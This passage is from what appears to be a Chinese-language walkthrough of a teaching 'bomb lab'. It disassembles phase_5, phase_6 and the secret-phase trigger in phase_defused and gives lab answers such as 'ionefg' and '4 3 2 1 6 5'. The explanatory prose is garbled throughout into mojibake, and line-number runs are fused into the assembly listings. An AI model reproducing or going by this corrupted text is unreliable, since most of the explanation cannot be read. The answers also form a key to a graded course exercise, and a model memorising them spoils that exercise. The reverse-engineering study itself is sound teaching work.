%eax,%eax4010c4: 74 13 je 4010d9 &lt;phase_5+0x77&gt;4010c6: e8 6f 03 00 00 callq 40143a &lt;explode_bomb&gt; æŽ¥ä¸‹æ¥å°†0x40245eè¿™ä¸ªåœ°å€èµ‹ç»™esiï¼ŒæŠŠrsp+0x10è¿™ä¸ªåœ°å€èµ‹ç»™rdiï¼ŒæŽ¥ä¸‹æ¥è°ƒç”¨strings_not_equalè¿™ä¸ªå‡½æ•°ï¼Œä¹‹å‰çš„ç»éªŒå‘Šè¯‰æˆ‘ä»¬esiä¸Žrdiå°±æ˜¯è¦æ¯”è¾ƒçš„ä¸¤ä¸ªå­—ç¬¦ä¸²çš„é¦–åœ°å€ã€‚å¦‚æžœä¸¤ä¸ªå­—ç¬¦ä¸²ä¸ç›¸åŒå°±å¼•çˆ†ç‚¸å¼¹ã€‚ æˆ‘ä»¬å…ˆçœ‹0x40245eä½ç½®çš„å­—ç¬¦ä¸²ï¼š è¿™å°±æ˜¯æˆ‘ä»¬åº”è¯¥æž„é€ å¹¶å­˜æ”¾åœ¨rsp+0x10å¤„çš„å­—ç¬¦ä¸²ã€‚ æŽ¥ä¸‹æ¥å†æŸ¥çœ‹æˆ‘ä»¬å¤åˆ¶åˆ°rspä¸­çš„å­—ç¬¦æ¥æºä¹Ÿå°±æ˜¯0x4024b0å¼€å§‹çš„å­—ç¬¦ï¼š å¯ä»¥çœ‹åˆ°æˆ‘ä»¬éœ€è¦çš„å­—ç¬¦flyersçš„ç´¢å¼•åˆ†åˆ«ä¸º9 15 14 5 6 7ã€‚è¿™ä¸ªç´¢å¼•å°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦çš„ä½Ž4ä½ï¼Œé‚£æˆ‘ä»¬åªè¦æ‰¾åˆ°ä½Ž4ä½åˆ†åˆ«æ˜¯ä»¥ä¸Šæ•°å€¼çš„å­—ç¬¦å°±å¯ä»¥äº†ã€‚ æ‰€ä»¥é˜¶æ®µ5çš„ï¼ˆä¸€ä¸ªï¼‰ç­”æ¡ˆä¸ºï¼š ionefg é˜¶æ®µå…­é˜¶æ®µå…­å¯ä»¥è¯´æ˜¯æœ€å¤æ‚çš„ä¸€ä¸ªé˜¶æ®µï¼ŒåŒæ ·ä¸€æ­¥æ­¥åˆ†æžï¼š 1234567891000000000004010f4 &lt;phase_6&gt;: 4010f4: 41 56 push %r14 4010f6: 41 55 push %r13 4010f8: 41 54 push %r12 4010fa: 55 push %rbp 4010fb: 53 push %rbx 4010fc: 48 83 ec 50 sub $0x50,%rsp 401100: 49 89 e5 mov %rsp,%r13 401103: 48 89 e6 mov %rsp,%rsi 401106: e8 51 03 00 00 callq 40145c &lt;read_six_numbers&gt; è¯»å…¥6ä¸ªæ•°å­—ï¼Œå­˜æ”¾ä½ç½®è¿˜æ˜¯æ ˆä¸­ã€‚ 1234567891011121314151617181920212240110b: 49 89 e6 mov %rsp,%r1440110e: 41 bc 00 00 00 00 mov $0x0,%r12d401114: 4c 89 ed mov %r13,%rbp401117: 41 8b 45 00 mov 0x0(%r13),%eax40111b: 83 e8 01 sub $0x1,%eax40111e: 83 f8 05 cmp $0x5,%eax401121: 76 05 jbe 401128 &lt;phase_6+0x34&gt;401123: e8 12 03 00 00 callq 40143a &lt;explode_bomb&gt;401128: 41 83 c4 01 add $0x1,%r12d40112c: 41 83 fc 06 cmp $0x6,%r12d401130: 74 21 je 401153 &lt;phase_6+0x5f&gt;401132: 44 89 e3 mov %r12d,%ebx401135: 48 63 c3 movslq %ebx,%rax401138: 8b 04 84 mov (%rsp,%rax,4),%eax40113b: 39 45 00 cmp %eax,0x0(%rbp)40113e: 75 05 jne 401145 &lt;phase_6+0x51&gt;401140: e8 f5 02 00 00 callq 40143a &lt;explode_bomb&gt;401145: 83 c3 01 add $0x1,%ebx401148: 83 fb 05 cmp $0x5,%ebx40114b: 7e e8 jle 401135 &lt;phase_6+0x41&gt;40114d: 49 83 c5 04 add $0x4,%r13401151: eb c1 jmp 401114 &lt;phase_6+0x20&gt; å‰é¢æ˜¯ä¸€ç³»åˆ—çš„èµ‹å€¼æ“ä½œï¼Œç¬¬5è¡Œå°†eaxå‡1ï¼Œeaxä¸­çš„å€¼æ˜¯rspä½ç½®å­˜æ”¾çš„å€¼ã€‚ç¬¬6ã€7ä¸¤è¡Œå°†å‡ä¸€ä»¥åŽçš„å€¼ä¸Ž5è¿›è¡Œæ¯”è¾ƒï¼Œå°äºŽç­‰äºŽ5åˆ™è·³è¿‡å¼•çˆ†ä»£ç ã€‚ä¹Ÿå°±æ˜¯è¯´rspä¸­å­˜æ”¾çš„ç¬¬ä¸€ä¸ªæ•°å¿…é¡»å°äºŽç­‰äºŽ6. ä¹‹å‰å°†r12dç½®ä¸º0ï¼Œç¬¬9è¡Œä¸­å°†r12dçš„å€¼å¢žåŠ 1ï¼Œä¸‹ä¸€è¡Œä¸Ž6è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æžœç›¸ç­‰åˆ™è·³å…¥ä¸‹ä¸€ä¸ªé˜¶æ®µã€‚ ç¬¬12è¡Œä¸­æŠŠr12dä¸­çš„å€¼å¤åˆ¶ç»™äº†ebxï¼Œä¸‹ä¸€æ­¥åˆèµ‹ç»™äº†raxï¼ŒæŽ¥ä¸‹æ¥çš„ä¸€è¡Œmovå°†rsp+rax*4ä¸­çš„å€¼ï¼ˆä¹Ÿå°±æ˜¯ç¬¬rax+1ä¸ªè¯»å…¥çš„intå€¼ï¼‰ç»™äº†eaxã€‚ ä¸‹ä¸€æ­¥å°†eaxä¸­çš„å€¼ä¸Žrbpåœ°å€æŒ‡å‘çš„å€¼è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æžœä¸ç›¸åŒåˆ™è·³è¿‡å¼•çˆ†ä»£ç ã€‚è¯´æ˜Žè¿™ä¸¤ä¸ªå€¼éœ€è¦ä¸åŒï¼Œå†æŽ¥ä¸‹æ¥å°†ebxä¸­çš„å€¼åŠ 1ï¼Œå†ä¸Ž5è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æžœå°äºŽç­‰äºŽ5åˆ™è·³åˆ°ç¬¬13è¡Œä¸­ï¼Œæ›´æ–°raxçš„å€¼ï¼Œå†åŽ»ä»Žæ ˆä¸­å–ä¸‹ä¸€ä¸ªæ–°çš„intå€¼å’Œrbpä¸­çš„è¿›è¡Œæ¯”è¾ƒã€‚åˆ°è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼Œä»Ž13è¡Œåˆ°20è¡Œç›¸å½“äºŽä¸€ä¸ªå†…å¾ªçŽ¯ï¼Œä»Žr12då¼€å§‹ï¼Œåˆ°5ç»“æŸï¼Œä¸æ–­åœ°å–æ ˆä¸­çš„å€¼ä¸Žrbpçš„å€¼æ¯”è¾ƒï¼Œä¹Ÿå°±æ˜¯è¦æ±‚rbpä¹‹åŽçš„å€¼éœ€è¦ä¸Žrbpä¸åŒã€‚ ç¬¬21ã€22è¡Œåˆ™æ˜¯å¤–å¾ªçŽ¯ï¼Œå®ƒæ›´æ–°äº†r13çš„å€¼ï¼Œä»¤r13æŒ‡å‘ä¸‹ä¸€ä¸ªintå€¼ã€‚è·³åˆ°ç¬¬3è¡Œç”¨r13çš„å€¼æ›´æ–°rbpçš„å€¼ï¼Œä¹Ÿå°±æ˜¯æŠŠæ¯”è¾ƒçš„å¯¹è±¡å‘åŽç§»ä¸€ä¸ªã€‚åŒæ ·è¦æ±‚è¯¥å€¼å°äºŽç­‰äºŽ5ã€‚åŽé¢å†è¿›è¡Œå†…å¾ªçŽ¯æ¯”è¾ƒä¹‹åŽçš„å€¼ã€‚ è¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥æ˜Žç™½è¿™æ®µä»£ç çš„ä½œç”¨ï¼šé™åˆ¶è¯»å…¥çš„6ä¸ªæ•°å¿…é¡»å°äºŽç­‰äºŽ6å¹¶ä¸”äº’ä¸ç›¸ç­‰ã€‚ 123456789401153: 48 8d 74 24 18 lea 0x18(%rsp),%rsi401158: 4c 89 f0 mov %r14,%rax40115b: b9 07 00 00 00 mov $0x7,%ecx401160: 89 ca mov %ecx,%edx401162: 2b 10 sub (%rax),%edx401164: 89 10 mov %edx,(%rax)401166: 48 83 c0 04 add $0x4,%rax40116a: 48 39 f0 cmp %rsi,%rax40116d: 75 f1 jne 401160 &lt;phase_6+0x6c&gt; ç¬¬1è¡Œä¸­å°†rsp+0x18çš„å€¼èµ‹ç»™rsiã€‚ ç¬¬2è¡Œå°†r14çš„å€¼èµ‹ç»™raxï¼Œr14çš„å€¼æ˜¯ä¹‹å‰ä¿å­˜çš„rspã€‚ ç¬¬3è¡Œå°†0x7èµ‹ç»™ecxï¼Œç¬¬4è¡Œåˆå°†ecxå¤åˆ¶ç»™edxã€‚ ä¸‹ä¸€æ­¥å°†edxå‡åŽ»raxå­˜æ”¾çš„åœ°å€æŒ‡å‘çš„å€¼ï¼ŒæŽ¥ä¸‹æ¥åˆå°†edxçš„å€¼èµ‹å›žraxå­˜æ”¾çš„åœ°å€æŒ‡å‘çš„å€¼ã€‚ ç¬¬7è¡Œå°†raxçš„å€¼åŠ 4ï¼Œä¹Ÿå°±æ˜¯æŒ‡å‘äº†ä¸‹ä¸€ä¸ªintå€¼ï¼ŒæŽ¥ç€ä¸Žä¹‹å‰è®¾å®šçš„rsiè¿›è¡Œçš„æ¯”è¾ƒï¼Œå¦‚æžœä¸ç›¸ç­‰åˆ™é‡å¤è¿™ä¸ªè¿‡ç¨‹ã€‚rsiå®žé™…ä¸ŠæŒ‡å‘çš„æ˜¯6ä¸ªintå€¼ä¹‹åŽçš„ä½ç½®ï¼Œä½œä¸ºä¸€ä¸ªæ ‡è®°ä½¿ç”¨ã€‚ è¿™æ®µä»£ç æ€»ç»“èµ·æ¥å°±æ˜¯å°†æ ˆä¸­çš„6ä¸ªå€¼ï¼ˆå‡è®¾ä¸ºxï¼‰å˜ä¸º7-xã€‚ 123456789101112131415161718192040116f: be 00 00 00 00 mov $0x0,%esi401174: eb 21 jmp 401197 &lt;phase_6+0xa3&gt;401176: 48 8b 52 08 mov 0x8(%rdx),%rdx40117a: 83 c0 01 add $0x1,%eax40117d: 39 c8 cmp %ecx,%eax40117f: 75 f5 jne 401176 &lt;phase_6+0x82&gt;401181: eb 05 jmp 401188 &lt;phase_6+0x94&gt;401183: ba d0 32 60 00 mov $0x6032d0,%edx401188: 48 89 54 74 20 mov %rdx,0x20(%rsp,%rsi,2)40118d: 48 83 c6 04 add $0x4,%rsi401191: 48 83 fe 18 cmp $0x18,%rsi401195: 74 14 je 4011ab &lt;phase_6+0xb7&gt;401197: 8b 0c 34 mov (%rsp,%rsi,1),%ecx40119a: 83 f9 01 cmp $0x1,%ecx40119d: 7e e4 jle 401183 &lt;phase_6+0x8f&gt;40119f: b8 01 00 00 00 mov $0x1,%eax4011a4: ba d0 32 60 00 mov $0x6032d0,%edx4011a9: eb cb jmp 401176 &lt;phase_6+0x82&gt; è¿›å…¥ä¸‹ä¸€æ®µä»£ç ï¼Œä¸€å¼€å§‹å…ˆå°†esiå½’é›¶ï¼Œç„¶åŽè·³åˆ°ç¬¬14è¡Œå¤„æ‰§è¡Œã€‚ ç¬¬14è¡Œä¸­ä»Žrsp+rsiçš„ä½ç½®ï¼ˆä¹Ÿå°±æ˜¯æ ˆä¸­æˆ‘ä»¬è¯»å…¥çš„ä½ç½®ï¼‰å–å‡ºä¸€ä¸ªæ•°èµ‹ç»™ecxï¼ŒæŽ¥ä¸‹æ¥å¯¹å–å‡ºçš„è¿™ä¸ªå€¼è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æžœå®ƒå°äºŽç­‰äºŽ1åˆ™è·³åˆ°ç¬¬9è¡Œå¤„ã€‚ æˆ‘ä»¬åœ¨è¿™é‡Œå‡è®¾è¿™ä¸ªæ•°ç¡®å®žå°äºŽç­‰äºŽ1ã€‚åˆ°ç¬¬9è¡Œï¼Œå°†ä¸€ä¸ªåœ°å€å€¼èµ‹ç»™äº†edxï¼ŒæŽ¥ä¸‹æ¥å°†edxçš„å€¼èµ‹ç»™äº†rsp+2*rsi+0x20çš„åœ°å€æŒ‡å‘çš„å€¼ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥çŸ¥é“rsièµ·åˆ°çš„æ˜¯ç´¢å¼•çš„ä½œç”¨ï¼Œä¸‹é¢ä¸€è¡Œå°†rsiå¢žåŠ 4ï¼Œè¯´æ˜Žä»Žrsp+0x20å¼€å§‹å­˜æ”¾8ä¸ªå­—èŠ‚çš„æ•°æ®ã€‚å†å°†rsiçš„å€¼ä¸Ž0x18ä½œæ¯”è¾ƒï¼Œè¯´æ˜Žæ•´ä¸ªè¿‡ç¨‹è¦è¿›è¡Œ6æ¬¡ã€‚æŽ¥ä¸‹æ¥åˆåˆ°äº†ç¬¬14è¡Œå°†ä¸‹ä¸€ä¸ªintå€¼ç»™rcxã€‚ é‚£ä¹ˆå¦‚æžœrcxçš„å€¼ä¸å°äºŽç­‰äºŽ1ï¼Œç»§ç»­å¾€ä¸‹èµ°ï¼Œç¬¬18è¡Œå°†0x1èµ‹ç»™eaxï¼Œ19è¡Œå°†0x6032d0è¿™ä¸ªåœ°å€èµ‹ç»™edxï¼ŒæŽ¥ä¸‹æ¥è·³è½¬åˆ°äº†ç¬¬3è¡Œã€‚ç¬¬3-6è¡Œçš„ä»£ç æ˜¯ä¸€èµ·çš„ï¼Œä¹Ÿæ˜¯ç†è§£è¿™ä¸ªè¿‡ç¨‹çš„å…³é”®ã€‚ é¦–å…ˆç¬¬3è¡Œçš„å‘½ä»¤ï¼ŒæŠŠedx+0x8åœ°å€æŒ‡å‘çš„å€¼èµ‹ç»™äº†edxï¼Œè¿™æ­¥æ“ä½œä¸€å¼€å§‹æ¯”è¾ƒéš¾ä»¥ç†è§£ï¼Œæˆ‘ä»¬éœ€è¦å…ˆçœ‹çœ‹edxçš„åˆå§‹çŠ¶æ€æ˜¯ä»€ä¹ˆæ ·çš„ï¼Œä½¿ç”¨gdbåœ¨è¿è¡Œæ—¶æŸ¥çœ‹å†…å­˜ï¼š æˆ‘ä»¬å¯ä»¥ä»Žè¿™ä¸ªä¿¡æ¯ä¸­çœ‹å‡ºï¼Œå…¶å®žå®ƒå°±æ˜¯ä¸€ä¸ªé“¾è¡¨çš„ç»“æž„ï¼Œé¦–å…ˆåå­—å°±æ˜¯nodeç»™äº†æç¤ºï¼Œå†è€…æ¯ä¸€ä¸ªnodeä¸­åç§»8ä¸ªå­—èŠ‚ä¸­å‚¨å­˜çš„éƒ½æ˜¯ä¸‹ä¸€ä¸ªèŠ‚ç‚¹çš„åœ°å€ï¼Œé‚£ä¹ˆå‰é¢8ä¸ªå­—èŠ‚è‡ªç„¶å°±æ˜¯èŠ‚ç‚¹å‚¨å­˜çš„æ•°æ®ã€‚ æˆ‘ä»¬å†å›žè¿‡å¤´æ¥çœ‹ç¬¬3è¡Œçš„ä»£ç ï¼Œå°±ä¸éš¾ç†è§£è¿™ä¸ªæ“ä½œå°±æ˜¯æˆ‘ä»¬å¸¸ç”¨çš„p = p -&gt; nextï¼Œä¹Ÿå°±æ˜¯æŒ‡å‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ã€‚ ç¬¬4è¡ŒæŠŠeaxå¢ž1ï¼Œå†å°†eaxä¸Žecxè¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æžœä¸ç­‰å°±å†è·³åˆ°ç¬¬3æ­¥æŒ‡å‘é“¾è¡¨ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ï¼Œé‚£ä¹ˆå¯ä»¥çœ‹å‡ºè¿™4è¡Œä»£ç çš„ä½œç”¨å°±æ˜¯ä»Žedxè¿™ä¸ªåˆå§‹ä½ç½®å¼€å§‹å‘åŽç§»åŠ¨ecx-1æ¬¡ï¼Œç¬¬7è¡Œè·³è¿‡äº†ç¬¬9è¡Œï¼ŒæŠŠedxèµ‹ç»™äº†rsp+0x20å¼€å§‹çš„ç¬¬rsiä¸ª8å­—èŠ‚çš„ä½ç½®ã€‚å¦‚æžœrsiè¾¾åˆ°0x18åˆ™è·³å‡ºè¿™éƒ¨åˆ†ä»£ç ã€‚ æˆ‘ä»¬æ•´ç†ä¸€ä¸‹è¿™ä¸ªè¿‡ç¨‹ï¼Œå…¶å®žå°±æ˜¯ä¾æ¬¡ä»Žæ ˆä¸­è¯»å–å­˜æ”¾çš„6ä¸ªæ•°æ”¾å…¥rcxï¼Œå†æ ¹æ®rcxçš„å€¼æ‰¾åˆ°é“¾è¡¨ä¸­å¯¹åº”çš„èŠ‚ç‚¹ï¼ŒæŠŠèŠ‚ç‚¹çš„åœ°å€æ”¾å…¥rsp+0x20å¼€å§‹çš„å¯¹åº”ä½ç½®ä¸­ã€‚ 1234567891011124011ab: 48 8b 5c 24 20 mov 0x20(%rsp),%rbx4011b0: 48 8d 44 24 28 lea 0x28(%rsp),%rax4011b5: 48 8d 74 24 50 lea 0x50(%rsp),%rsi4011ba: 48 89 d9 mov %rbx,%rcx4011bd: 48 8b 10 mov (%rax),%rdx4011c0: 48 89 51 08 mov %rdx,0x8(%rcx)4011c4: 48 83 c0 08 add $0x8,%rax4011c8: 48 39 f0 cmp %rsi,%rax4011cb: 74 05 je 4011d2 &lt;phase_6+0xde&gt;4011cd: 48 89 d1 mov %rdx,%rcx4011d0: eb eb jmp 4011bd &lt;phase_6+0xc9&gt;4011d2: 48 c7 42 08 00 00 00 movq $0x0,0x8(%rdx) è¿™æ®µä»£ç å‰ä¸‰è¡Œåˆ†åˆ«å°†rsp+0x20åœ°å€æŒ‡å‘å€¼ã€rsp+0x28çš„å€¼ã€rsp+0x50çš„å€¼èµ‹ç»™äº†rbx ã€raxã€rsiã€‚ç¬¬4è¡Œå°†rbxå¤åˆ¶åˆ°rcxä¸­ï¼Œç¬¬5è¡Œå°†raxï¼ˆrsp+0x20ï¼‰ä¸­å­˜æ”¾çš„åœ°å€å¤åˆ¶å…¥rdxï¼Œç¬¬6è¡Œå°†è¿™ä¸ªæ•°æ®èµ‹ç»™äº†rcxï¼ˆä¹Ÿå°±æ˜¯rbxã€*(rsp+0x20)ï¼‰èŠ‚ç‚¹çš„æŒ‡é’ˆåŸŸã€‚ä¸‹ä¸€æ­¥å°†raxå¢žåŠ 8ï¼ŒæŒ‡å‘æ ˆä¸­çš„ä¸‹ä¸€ä¸ªä½ç½®ã€‚å†ä¸Žrsiè¿™ä¸ªä¸´ç•Œåœ°å€è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æžœraxè¶…å‡ºæœ«ç«¯åˆ™è·³å‡ºè¿™æ®µä»£ç åˆ°ç¬¬12è¡Œçš„ä½ç½®ã€‚ ä¸‹é¢æŠŠrdxä¸­å­˜æ”¾çš„åœ°å€å€¼èµ‹ç»™rcxï¼Œè·³è½¬åˆ°ç¬¬5è¡Œé‡å¤è¿‡ç¨‹ã€‚ ä»”ç»†åˆ†æžï¼Œè¿™ä¸ªè¿‡ç¨‹å…¶å®žå°±æ˜¯æŒ‰ç…§é“¾è¡¨èŠ‚ç‚¹åœ¨æ ˆä¸­çš„ä½ç½®é‡æ–°å°†é“¾è¡¨è¿žæŽ¥èµ·æ¥ã€‚ æœ€åŽè·³å‡ºçš„ç¬¬12è¡Œåˆ™æ˜¯æŠŠæ–°çš„è¡¨å°¾çš„æŒ‡é’ˆåŸŸèµ‹ä¸ºNULLã€‚ 12345678910111213141516174011d9: 00 4011da: bd 05 00 00 00 mov $0x5,%ebp4011df: 48 8b 43 08 mov 0x8(%rbx),%rax4011e3: 8b 00 mov (%rax),%eax4011e5: 39 03 cmp %eax,(%rbx)4011e7: 7d 05 jge 4011ee &lt;phase_6+0xfa&gt;4011e9: e8 4c 02 00 00 callq 40143a &lt;explode_bomb&gt;4011ee: 48 8b 5b 08 mov 0x8(%rbx),%rbx4011f2: 83 ed 01 sub $0x1,%ebp4011f5: 75 e8 jne 4011df &lt;phase_6+0xeb&gt;4011f7: 48 83 c4 50 add $0x50,%rsp4011fb: 5b pop %rbx4011fc: 5d pop %rbp4011fd: 41 5c pop %r124011ff: 41 5d pop %r13401201: 41 5e pop %r14401203: c3 retq ç¬¬2è¡Œå°†ebpèµ‹ä¸Š0x5ï¼Œç¬¬ä¸‰è¡Œä¸­rbxçš„å€¼æ˜¯ä¹‹å‰çš„rsp+0x20ï¼Œé‚£ä¹ˆrbx+0x8è¿™ä¸ªåœ°å€ä¸­å­˜æ”¾çš„å€¼å°±æ˜¯ä¸‹ä¸€ä¸ªèŠ‚ç‚¹çš„åœ°å€ï¼Œèµ‹ç»™äº†raxã€‚ ç¬¬4è¡Œå°†raxä»£è¡¨çš„èŠ‚ç‚¹çš„æ•°æ®å–å‡ºæ”¾å…¥eaxï¼Œå†ä¸Žrbxä»£è¡¨çš„èŠ‚ç‚¹çš„æ•°æ®çš„å€¼çš„ä½Ž4ä½è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æžœå‰ä¸€ä¸ªèŠ‚ç‚¹çš„æ•°æ®çš„ä½Ž4å­—èŠ‚å¤§äºŽç­‰äºŽåŽä¸€ä¸ªèŠ‚ç‚¹çš„ï¼Œåˆ™è·³è¿‡å¼•çˆ†ä»£ç ã€‚ ç¬¬8è¡Œåˆæ˜¯ç†Ÿæ‚‰çš„æ“ä½œï¼šä½¿rbxæŒ‡å‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ã€‚ ç¬¬9ã€10è¡Œå‡å°ebpè¿™ä¸ªå¾ªçŽ¯å˜é‡å†è¿›è¡Œåˆ¤æ–­ï¼Œä¿è¯å¾ªçŽ¯è¿›è¡Œ5æ¬¡ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬éœ€è¦ä½¿æ–°çš„é“¾è¡¨ä¸­å‰ä¸€ä¸ªèŠ‚ç‚¹å­˜æ”¾çš„æ•°æ®å€¼çš„ä½Ž4å­—èŠ‚éƒ½å¤§äºŽåŽä¸€ä¸ªèŠ‚ç‚¹çš„ã€‚ å¼„æ¸…æ¥šäº†è¿‡ç¨‹ï¼Œä¸‹é¢å°±å¯ä»¥å¼€å§‹åæŽ¨ç­”æ¡ˆäº†ï¼š å…ˆæ‰¾åˆ°æ­£ç¡®çš„é“¾è¡¨èŠ‚ç‚¹æŽ’åˆ—ï¼Œæ ¹æ®å›¾ï¼š æ•°æ®ç”±å¤§åˆ°å°çš„æŽ’åˆ—ä¾æ¬¡æ˜¯3 4 5 6 1 2ã€‚ ç”±äºŽæœ‰ä¸€æ­¥x = 7 - xï¼Œæ‰€ä»¥å€’æŽ¨å›žæ¥çš„ç­”æ¡ˆåº”è¯¥æ˜¯ï¼š 4 3 2 1 6 5 ç§˜å¯†é˜¶æ®µåœ¨ä¹‹å‰Cä»£ç çš„æš—ç¤ºä»¥åŠæˆ‘ä»¬æŸ¥çœ‹æ±‡ç¼–ä»£ç çš„è¿‡ç¨‹ä¸­éƒ½å¯ä»¥çŒœæµ‹å‡ºæœ‰ä¸€ä¸ªç§˜å¯†é˜¶æ®µçš„å­˜åœ¨ï¼Œsecret_phaseçš„ä»£ç å°±åœ¨phase_6åŽçš„func7ä¹‹åŽã€‚ç¬¬ä¸€ä¸ªé—®é¢˜æ˜¯æˆ‘ä»¬å¦‚ä½•è¿›å…¥secret_phaseã€‚ è¿™é‡Œå¯ä»¥ç”¨ä¸€ä¸ªç®€å•çš„æ–¹æ³•ï¼Œç›´æŽ¥åœ¨åæ±‡ç¼–ä»£ç ä¸­æœç´¢secret_phaseçš„å…¥å£åœ°å€ï¼Œå¾ˆå¿«å°±å¯ä»¥å‘çŽ°åœ¨æ¯ä¸ªé˜¶æ®µçš„phase_xä¹‹åŽéƒ½æœ‰ä¸€è¡Œphase_defusedï¼Œå°±åœ¨è¿™ä¸ªå‡½æ•°é‡Œé¢å­˜åœ¨callq secret_phaseçš„ä»£ç ã€‚ æˆ‘ä»¬å°±å¼€å§‹åˆ†æžè¿™ä¸ªphase_defusedï¼š 12345678910111213141516171819202122232425262728293031323334353600000000004015c4 &lt;phase_defused&gt;: 4015c4: 48 83 ec 78 sub $0x78,%rsp 4015c8: 64 48 8b 04 25 28 00 mov %fs:0x28,%rax 4015cf: 00 00 4015d1: 48 89 44 24 68 mov %rax,0x68(%rsp) 4015d6: 31 c0 xor %eax,%eax 4015d8: 83 3d 81 21 20 00 06 cmpl $0x6,0x202181(%rip) # 603760 &lt;num_input_strings&gt; 4015df: 75 5e jne 40163f &lt;phase_defused+0x7b&gt; 4015e1: 4c 8d 44 24 10 lea 0x10(%rsp),%r8 4015e6: 48 8d 4c 24 0c lea 0xc(%rsp),%rcx 4015eb: 48 8d 54 24 08 lea 0x8(%rsp),%rdx 4015f0: be 19 26 40 00 mov $0x402619,%esi 4015f5: bf 70 38 60 00 mov $0x603870,%edi 4015fa: e8 f1 f5 ff ff callq 400bf0 &lt;__isoc99_sscanf@plt&gt; 4015ff: 83 f8 03 cmp $0x3,%eax 401602: 75 31 jne 401635 &lt;phase_defused+0x71&gt; 401604: be 22 26 40 00 mov $0x402622,%esi 401609: 48 8d 7c 24 10 lea 0x10(%rsp),%rdi 40160e: e8 25 fd ff ff callq 401338 &lt;strings_not_equal&gt; 401613: 85 c0 test %eax,%eax 401615: 75 1e jne 401635 &lt;phase_defused+0x71&gt; 401617: bf f8 24 40 00 mov $0x4024f8,%edi 40161c: e8 ef f4 ff ff callq 400b10 &lt;puts@plt&gt; 401621: bf 20 25 40 00 mov $0x402520,%edi 401626: e8 e5 f4 ff ff callq 400b10 &lt;puts@plt&gt; 40162b: b8 00 00 00 00 mov $0x0,%eax 401630: e8 0d fc ff ff callq 401242 &lt;secret_phase&gt; 401635: bf 58 25 40 00 mov $0x402558,%edi 40163a: e8 d1 f4 ff ff callq 400b10 &lt;puts@plt&gt; 40163f: 48 8b 44 24 68 mov 0x68(%rsp),%rax 401644: 64 48 33 04 25 28 00 xor %fs:0x28,%rax 40164b: 00 00 40164d: 74 05 je 401654 &lt;phase_defused+0x90&gt; 40164f: e8 dc f4 ff ff callq 400b30 &lt;__stack_chk_fail@plt&gt; 401654: 48 83 c4 78 add $0x78,%rsp 401658: c3 retq å¯ä»¥çœ‹åˆ°ç¬¬7è¡Œå°†å‡½æ•°num_input_stringsçš„è¿”å›žå€¼ä¸Ž6è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æžœä¸ç­‰äºŽ6åˆ™çš„ç›´æŽ¥è·³è¿‡ä¸­é—´ä»£ç åˆ°è¾¾æœ€åŽçš„ç»“æŸéƒ¨åˆ†ã€‚ ä»Žå‡½æ•°åæˆ‘ä»¬å¯ä»¥æŽ¨æµ‹è¿™ä¸ªå‡½æ•°çš„ä½œç”¨çš„æ˜¯æ£€æµ‹è¯»å–çš„å­—ç¬¦ä¸²çš„æ•°é‡ï¼Œå½“è¯»å–äº†6ä¸ªå­—ç¬¦ä¸²æ—¶ï¼Œå°±ä¸ä¼šè·³è¿‡ä¸­é—´çš„ä»£ç ã€‚æˆ‘ä»¬ç»§ç»­çœ‹ä¸­é—´çš„ä»£ç ï¼š ç¬¬9åˆ°14è¡Œåˆæ˜¯ç†Ÿæ‚‰çš„sscanfè°ƒç”¨è¿‡ç¨‹ï¼Œæˆ‘ä»¬å·²ç»çŸ¥é“esiæŒ‡å‘çš„æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„é¦–åœ°å€ï¼Œæˆ‘ä»¬å…ˆæ¥æŸ¥çœ‹å®ƒçš„å†…å®¹ï¼š è¯»å–ä¸¤ä¸ªæ•´æ•°å’Œä¸€ä¸ªå­—ç¬¦ä¸²ã€‚ æœ‰æ‰€ä¸åŒçš„æ˜¯åœ¨12è¡Œä¹‹åŽåˆæœ‰ä¸€è¡Œç»™edièµ‹ä¸Šäº†ä¸€ä¸ªåœ°å€å€¼ï¼Œæˆ‘ä»¬ä¹‹å‰æ‰€æœ‰é˜¶æ®µä¸­ediçš„å€¼éƒ½æ˜¯æ¥è‡ªäºŽæˆ‘ä»¬read_lineçš„åœ°å€ï¼Œæƒ³åˆ°sscanf å‚æ•°ä¸­ç¡®å®žå­˜åœ¨ä¸€ä¸ªè¾“å…¥ï¼Œæˆ‘ä»¬å¯ä»¥æŽ¨æµ‹è¿™ä¸ªediä¸­å­˜æ”¾çš„æ˜¯æˆ‘ä»¬è¯»å–ä½ç½®çš„é¦–åœ°å€ã€‚ é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åœ¨è¿è¡Œæ—¶æŸ¥çœ‹è¿™ä¸ªåœ°å€çš„å†…å®¹ï¼Œçœ‹æ˜¯ä»Žå“ªé‡Œè¿›è¡Œè¯»å–çš„ï¼š é¦–å…ˆç¬¦å·è¡¨å‘Šè¯‰æˆ‘ä»¬è¿™æ®µæ•°æ®çš„åå­—å«åšinput_stringsä¹Ÿå°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆè¿™ä¸ªåœ°å€ä¸Šçš„0 0ä»£è¡¨çš„åº”è¯¥å°±æ˜¯æˆ‘ä»¬çš„ç¬¬4è¡Œè¾“å…¥ã€‚ä¸¤ä¸ªæ•´åž‹æ•°å­—æ­£å¥½ä¸Žæ ¼å¼åŒ–å­—ç¬¦ä¸²ä¹Ÿæ˜¯åŒ¹é…çš„ã€‚çŽ°åœ¨æˆ‘ä»¬çŸ¥é“ï¼Œåº”è¯¥åœ¨è¿™ä¸¤ä¸ª0ä¹‹åŽå†è¿½åŠ ä¸€ä¸ªå­—ç¬¦ä¸²ä½œä¸ºè¾“å…¥ã€‚ 